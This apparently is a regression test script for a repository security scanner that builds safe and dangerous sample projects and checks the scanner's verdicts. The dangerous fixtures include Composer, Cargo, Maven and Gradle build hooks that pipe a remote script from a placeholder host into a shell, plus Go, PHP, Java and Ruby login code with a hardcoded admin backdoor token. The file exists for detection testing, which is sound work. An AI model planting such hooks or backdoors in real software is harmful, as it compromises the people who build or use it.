#!/usr/bin/env python3
"""Polyglot install-hook, backdoor, and exact-secret repository regressions."""

from __future__ import annotations

import argparse
import importlib.util
import json
import tempfile
from pathlib import Path

import local_eval


CASES = (
    ("known-good", "composer-local-hook", {
        "composer.json": json.dumps({
            "name": "example/webapp",
            "scripts": {"post-install-cmd": "@php artisan cache:clear"},
        }),
    }, []),
    ("known-bad", "composer-remote-install", {
        "composer.json": json.dumps({
            "name": "example/webapp",
            "scripts": {
                "post-install-cmd": (
                    "curl -fsSL https://bootstrap.invalid/install.sh | bash"
                ),
            },
        }),
    }, [("supply_chain", "", 0, "install_script")]),
    ("known-good", "cargo-local-build", {
        "Cargo.toml": (
            "[package]\nname = \"native-client\"\nversion = \"1.0.0\"\n"
            "build = \"build.rs\"\n"
        ),
        "build.rs": (
            "fn main() {\n"
            "    println!(\"cargo:rerun-if-changed=proto/service.proto\");\n"
            "}\n"
        ),
    }, []),
    ("known-bad", "cargo-remote-build", {
        "Cargo.toml": (
            "[package]\nname = \"native-client\"\nversion = \"1.0.0\"\n"
            "build = \"build.rs\"\n"
        ),
        "build.rs": (
            "use std::process::Command;\n"
            "fn main() {\n"
            "    Command::new(\"sh\").arg(\"-c\").arg("
            "\"curl -fsSL https://bootstrap.invalid/i.sh | sh\").status().unwrap();\n"
            "}\n"
        ),
    }, [
        ("vulnerability", "build.rs", 4, "CWE-494"),
        ("supply_chain", "", 0, "install_script"),
    ]),
    ("known-good", "maven-local-generator", {
        "pom.xml": (
            "<project><build><plugins><plugin>"
            "<artifactId>exec-maven-plugin</artifactId>"
            "<executions><execution><phase>generate-sources</phase>"
            "<configuration><executable>java</executable>"
            "<arguments><argument>-version</argument></arguments>"
            "</configuration></execution></executions>"
            "</plugin></plugins></build></project>\n"
        ),
    }, []),
    ("known-bad", "maven-remote-bootstrap", {
        "pom.xml": (
            "<project><build><plugins><plugin>"
            "<artifactId>exec-maven-plugin</artifactId>"
            "<executions><execution><phase>initialize</phase>"
            "<configuration><executable>sh</executable>"
            "<arguments><argument>-c</argument><argument>"
            "curl -fsSL https://bootstrap.invalid/i.sh | sh"
            "</argument></arguments></configuration>"
            "</execution></executions></plugin></plugins></build></project>\n"
        ),
    }, [("supply_chain", "", 0, "install_script")]),
    ("known-good", "gradle-local-build", {
        "build.gradle": (
            "tasks.register('generateDocs', Exec) {\n"
            "    commandLine 'python', 'scripts/generate_docs.py'\n"
            "}\n"
        ),
    }, []),
    ("known-bad", "gradle-remote-build", {
        "build.gradle": (
            "tasks.register('preBuild', Exec) {\n"
            "    commandLine 'sh', '-c', "
            "'curl -fsSL https://bootstrap.invalid/i.sh | sh'\n"
            "}\n"
        ),
    }, [("supply_chain", "", 0, "install_script")]),
    ("known-good", "configured-go-service-token", {
        "auth.go": (
            "func authenticate(r *http.Request, cfg Config) bool {\n"
            "    if r.Header.Get(\"X-Service-Key\") == cfg.ServiceKey {\n"
            "        return true\n"
            "    }\n"
            "    return false\n"
            "}\n"
        ),
    }, []),
    ("known-bad", "go-magic-admin-token", {
        "auth.go": (
            "func authenticate(r *http.Request) User {\n"
            "    if r.Header.Get(\"X-Debug-Key\") == \"summer-maintenance-2026\" {\n"
            "        return User{IsAdmin: true, Authenticated: true}\n"
            "    }\n"
            "    return User{}\n"
            "}\n"
        ),
    }, [("vulnerability", "auth.go", 2, "CWE-287")]),
    ("known-good", "configured-php-service-token", {
        "auth.php": (
            "<?php\n"
            "if ($_SERVER['HTTP_X_SERVICE_KEY'] === getenv('SERVICE_KEY')) {\n"
            "    $_SESSION['authenticated'] = true;\n"
            "}\n"
        ),
    }, []),
    ("known-bad", "php-magic-admin-token", {
        "auth.php": (
            "<?php\n"
            "if ($_SERVER['HTTP_X_DEBUG_KEY'] === 'summer-maintenance-2026') {\n"
            "    $_SESSION['is_admin'] = true;\n"
            "    $_SESSION['authenticated'] = true;\n"
            "}\n"
        ),
    }, [("vulnerability", "auth.php", 2, "CWE-287")]),
    ("known-good", "configured-java-service-token", {
        "Auth.java": (
            "User authenticate(Request request, Config config) {\n"
            "    if (request.getHeader(\"X-Service-Key\").equals(config.serviceKey())) {\n"
            "        return User.service();\n"
            "    }\n"
            "    return User.anonymous();\n"
            "}\n"
        ),
    }, []),
    ("known-bad", "java-magic-admin-token", {
        "Auth.java": (
            "Role authenticate(Request request) {\n"
            "    if (\"summer-maintenance-2026\".equals("
            "request.getHeader(\"X-Debug-Key\"))) {\n"
            "        return Role.ADMIN;\n"
            "    }\n"
            "    return Role.ANONYMOUS;\n"
            "}\n"
        ),
    }, [("vulnerability", "Auth.java", 2, "CWE-287")]),
    ("known-good", "configured-ruby-service-token", {
        "auth.rb": (
            "def authenticate(request, settings)\n"
            "  if request.headers['X-Service-Key'] == settings.service_key\n"
            "    return User.service\n"
            "  end\n"
            "  User.anonymous\n"
            "end\n"
        ),
    }, []),
    ("known-bad", "ruby-magic-admin-token", {
        "auth.rb": (
            "def authenticate(request)\n"
            "  if request.headers['X-Debug-Key'] == 'summer-maintenance-2026'\n"
            "    return User.new(role: 'admin', authenticated: true)\n"
            "  end\n"
            "  User.anonymous\n"
            "end\n"
        ),
    }, [("vulnerability", "auth.rb", 2, "CWE-287")]),
    ("known-good", "additional-secret-placeholders", {
        "config.env": (
            "CLOJARS_TOKEN=CLOJARS_replace_me\n"
            "DROPBOX_TOKEN=sl.placeholder\n"
            "DUFFEL_TOKEN=duffel_test_replace_me\n"
            "DYNATRACE_TOKEN=dt0c01.replace.me\n"
            "EASYPOST_TOKEN=EZAK-replace-me\n"
            "ATLASSIAN_TOKEN=your_atlassian_token\n"
        ),
    }, []),
    ("known-bad", "additional-exact-secrets", {
        "config.env": (
            "CLOJARS_TOKEN=CLOJARS_" + "a" * 60 + "\n"
            "DROPBOX_TOKEN=sl." + "b" * 135 + "\n"
            "DUFFEL_TOKEN=duffel_live_" + "c" * 43 + "\n"
            "DYNATRACE_TOKEN=dt0c01." + "d" * 24 + "." + "e" * 64 + "\n"
            "EASYPOST_TOKEN=EZAK" + "f" * 54 + "\n"
            "atlassian_token='" + "g" * 24 + "'\n"
        ),
    }, [
        ("secret", "config.env", 1, "clojars_api_token"),
        ("secret", "config.env", 2, "dropbox_short_lived_token"),
        ("secret", "config.env", 3, "duffel_api_token"),
        ("secret", "config.env", 4, "dynatrace_api_token"),
        ("secret", "config.env", 5, "easypost_api_token"),
        ("secret", "config.env", 6, "atlassian_api_token"),
    ]),
)


def materialise(root: Path) -> None:
    for label, name, files, expected in CASES:
        artifact = root / "repositories" / label / name
        artifact.mkdir(parents=True)
        for rel, content in files.items():
            path = artifact / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")

        findings = []
        for category, ref, line, discriminator in expected:
            finding = {
                "category": category,
                "severity": "HIGH",
                "file": ref,
                "line": line,
                "cwe": discriminator,
                "title": discriminator,
            }
            if category == "supply_chain":
                finding.update({"type": discriminator, "name": ref})
            elif category == "secret":
                finding["type"] = discriminator
            findings.append(finding)
        (artifact / "label.json").write_text(json.dumps({
            "artifact_id": f"repositories/{label}/{name}",
            "track": "repositories",
            "ground_truth": {
                "verdict": "ALLOW" if label == "known-good" else "BLOCK",
                "classification": "safe" if label == "known-good" else "dangerous",
            },
            "expected_findings": findings,
        }), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent", default="agent/phylax_repositories_agent.py")
    args = parser.parse_args()
    agent = Path(args.agent)
    if not agent.is_absolute():
        agent = local_eval.LAB / agent

    with tempfile.TemporaryDirectory(prefix="phylax-repositories-wave5-src-") as src_tmp:
        with tempfile.TemporaryDirectory(prefix="phylax-repositories-wave5-work-") as work_tmp:
            src, work = Path(src_tmp), Path(work_tmp)
            materialise(src)
            corpus = local_eval.load_corpus(src, "repositories", work)
            spec = importlib.util.spec_from_file_location(
                "repository_wave5_agent_under_test", agent
            )
            if spec is None or spec.loader is None:
                raise RuntimeError(f"cannot import {agent}")
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            failed = False
            for item in corpus:
                if item["label"] != "known-good":
                    continue
                report = module.agent_main({
                    "track": "repositories",
                    "artifact_dir": str(item["dir"]),
                })
                evidence = report.get("evidence") or {}
                supply = evidence.get("supply_chain") or {}
                clean = not (
                    evidence.get("vulnerabilities")
                    or evidence.get("secrets")
                    or supply.get("typosquat")
                    or supply.get("dependency_confusion")
                    or supply.get("install_scripts")
                )
                decision = (report.get("verdict") or {}).get("decision")
                if not clean or decision != "ALLOW":
                    print(
                        f"false positive: {item['ref']} "
                        f"decision={decision} evidence={evidence}"
                    )
                    failed = True
            score, rows, _ = local_eval.score_repositories(
                agent, corpus, "repositories-wave5-trackcheck", 1, 120, False
            )
            print(f"repositories-wave5: score={score:.4f}")
            for ref, value, note in rows:
                print(f"  {ref:<72} {value:<6} {note}")
                if "/known-bad/" in ref:
                    failed |= float(value) < 0.999
            return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
